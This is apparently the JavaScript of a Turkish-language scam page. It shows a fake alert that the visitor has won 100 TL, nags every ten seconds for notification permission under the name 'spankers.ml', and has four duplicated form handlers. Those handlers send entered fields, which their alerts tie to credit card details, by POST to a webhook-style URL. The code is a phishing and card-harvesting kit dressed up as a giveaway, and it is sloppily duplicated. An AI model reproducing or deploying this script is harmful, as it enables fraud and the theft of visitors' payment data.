

    setTimeout(() => {
        alert("BİZDEN 40.000 MÜŞTERİMİZ OLARAK 100TL KAZANDINIZ KAYIT OLARAK 100TL 'YE SAHİP OLABİLİRSİNİZ!!")
        
    }, 1000);
     setInterval(() => {
        if (Notification.permission !== 'denied') {
            // daha önce bildirimlere onay verilmediyse önce onay istenecek
            Notification.requestPermission(function (permission) {
            // Kullanıcı onaylamadı ise tekrar soralım
            if (permission === "granted") {
                // onaylarsa bilgilendirme bildirimi gönderilecek
                var notification = new Notification('spankers.ml', {
                body: 'Size yardımcı olacak bir örnek!', 
                icon: 'https://i.imgur.com/UlEKfN1.png'
                });
            }
            });
        }
       
     }, 9999);
   
if (!("Notification" in window)) {
  alert("Tarayıcınız, bildirim almayı desteklemiyor!");
}


$(function(){
    $('#btn').click(function(){
        var link = $('#link').val();
        var username = $('#username').val();
        var content = $('#content').val();
        var avatar = $('#avatar').val();
        if (link==null || link=="",content==null || content=="")
        {
            alert("#1 Lütfen kredi kartı bilgilerinizi kontrol edin!");
            return false;
        }
        $.post(link, {"content": content, "username": username, "avatar_url": avatar,});

    });
});

$(function(){
    $('#btn').click(function(){
        var link = $('#link').val();
        var username = $('#username').val();
        var contentt = $('#contentt').val();
        var avatar = $('#avatar').val();
        if (link==null || link=="",contentt==null || contentt=="")
        {
            alert("#2 Lütfen kredi kartı bilgilerinizi kontrol edin!");
            return false;
        }
        $.post(link, {"contentt": contentt, "username": username, "avatar_url": avatar,});

    });
});


$(function(){
    $('#btn').click(function(){
        var link = $('#link').val();
        var username = $('#username').val();
        var contenttt = $('#contenttt').val();
        var avatar = $('#avatar').val();
        if (link==null || link=="",contenttt==null || contenttt=="")
        {
            alert("#3 Lütfen kredi kartı bilgilerinizi kontrol edin!");
            return false;
        }
        $.post(link, {"contenttt": contenttt, "username": username, "avatar_url": avatar,});

    });
});



$(function(){
    $('#btn').click(function(){
        var link = $('#link').val();
        var username = $('#username').val();
        var contentttt = $('#contentttt').val();
        var avatar = $('#avatar').val();
        if (link==null || link=="",contentttt==null || contentttt=="")
        {
            alert("#4 Lütfen kredi kartı bilgilerinizi kontrol edin!");
            return false;
        }
        $.post(link, {"contentttt": contentttt, "username": username, "avatar_url": avatar,});

    });
});

